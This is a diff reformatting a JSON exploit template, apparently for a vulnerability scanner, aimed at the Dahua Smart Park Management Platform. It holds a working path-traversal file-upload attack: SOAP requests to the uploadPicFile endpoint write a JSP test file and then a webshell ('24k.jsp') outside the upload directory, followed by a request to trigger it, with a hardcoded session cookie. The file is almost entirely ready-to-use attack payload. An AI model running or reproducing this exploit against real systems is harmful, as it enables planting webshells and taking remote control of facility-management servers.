@@ -1,36 +1,1 @@
-{
-  "name":"大华智慧园区管理平台poi文件上传",
-  "tag":"dahua",
-  "type":"upload",
-  "poc": {
-    "pocGet": "/emap/webservice/gis/soap/poi",
-    "pocPost": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:res=\"http://response.webservice.poi.mapbiz.emap.dahuatech.com/\">\r\n   <soapenv:Header/>\r\n   <soapenv:Body>\r\n      <res:uploadPicFile>\r\n         <!--type: string-->\r\n         <arg0>/../../test.jsp</arg0>\r\n         <!--type: base64Binary-->\r\n         <arg1>PCVvdXQucHJpbnQoIjExbnh4Iik7JT4=</arg1>\r\n      </res:uploadPicFile>\r\n   </soapenv:Body>\r\n</soapenv:Envelope>",
-    "header": {
-      "cookie": "hades-session-id=cbbce521-a761-403d-b699-9849d2cb06b9;",
-      "User-Agent": "Mozilla/5.0 (Linux;",
-      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
-    },
-    "Pattern": "(uploadPicFileResponse)"
-  },
-  "exp": {
-    "step1": {
-      "expGet": "/emap/webservice/gis/soap/poi",
-      "expPost": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:res=\"http://response.webservice.poi.mapbiz.emap.dahuatech.com/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <res:uploadPicFile>\n         <!--type: string-->\n         <arg0>/../../24k.jsp</arg0>\n         <!--type: base64Binary-->\n         <arg1>{webshell:Base64Encode:1}</arg1>\n      </res:uploadPicFile>\n   </soapenv:Body>\n</soapenv:Envelope>",
-      "header": {
-        "cookie": "hades-session-id=cbbce521-a761-403d-b699-9849d2cb06b9;",
-        "User-Agent": "Mozilla/5.0 (Linux;",
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
-      },
-      "Pattern": "(uploadPicFileResponse)"
-    },
-    "step2": {
-      "expGet": "/upload/24k.jsp",
-      "header": {
-        "cookie": "hades-session-id=cbbce521-a761-403d-b699-9849d2cb06b9;",
-        "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryCJEleSRxsqS0lAFv",
-        "User-Agent": "Mozilla/5.0 (Linux;"
-      },
-      "Pattern": "()"
-    }
-  }
-}
+{  "name":"大华智慧园区管理平台poi文件上传",  "tag":"dahua",  "type":"upload",  "poc": {    "pocGet": "/emap/webservice/gis/soap/poi",    "pocPost": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:res=\"http://response.webservice.poi.mapbiz.emap.dahuatech.com/\">\r\r\n   <soapenv:Header/>\r\r\n   <soapenv:Body>\r\r\n      <res:uploadPicFile>\r\r\n         <!--type: string-->\r\r\n         <arg0>/../../test.jsp</arg0>\r\r\n         <!--type: base64Binary-->\r\r\n         <arg1>PCVvdXQucHJpbnQoIjExbnh4Iik7JT4=</arg1>\r\r\n      </res:uploadPicFile>\r\r\n   </soapenv:Body>\r\r\n</soapenv:Envelope>",    "header": {      "cookie": "hades-session-id=cbbce521-a761-403d-b699-9849d2cb06b9;",      "User-Agent": "Mozilla/5.0 (Linux;",      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"    },    "Pattern": "(uploadPicFileResponse)"  },  "exp": {    "step1": {      "expGet": "/emap/webservice/gis/soap/poi",      "expPost": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:res=\"http://response.webservice.poi.mapbiz.emap.dahuatech.com/\">\r\n   <soapenv:Header/>\r\n   <soapenv:Body>\r\n      <res:uploadPicFile>\r\n         <!--type: string-->\r\n         <arg0>/../../24k.jsp</arg0>\r\n         <!--type: base64Binary-->\r\n         <arg1>{webshell:Base64Encode:1}</arg1>\r\n      </res:uploadPicFile>\r\n   </soapenv:Body>\r\n</soapenv:Envelope>",      "header": {        "cookie": "hades-session-id=cbbce521-a761-403d-b699-9849d2cb06b9;",        "User-Agent": "Mozilla/5.0 (Linux;",        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"      },      "Pattern": "(uploadPicFileResponse)"    },    "step2": {      "expGet": "/upload/24k.jsp",      "header": {        "cookie": "hades-session-id=cbbce521-a761-403d-b699-9849d2cb06b9;",        "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryCJEleSRxsqS0lAFv",        "User-Agent": "Mozilla/5.0 (Linux;"      },      "Pattern": "()"    }  }}
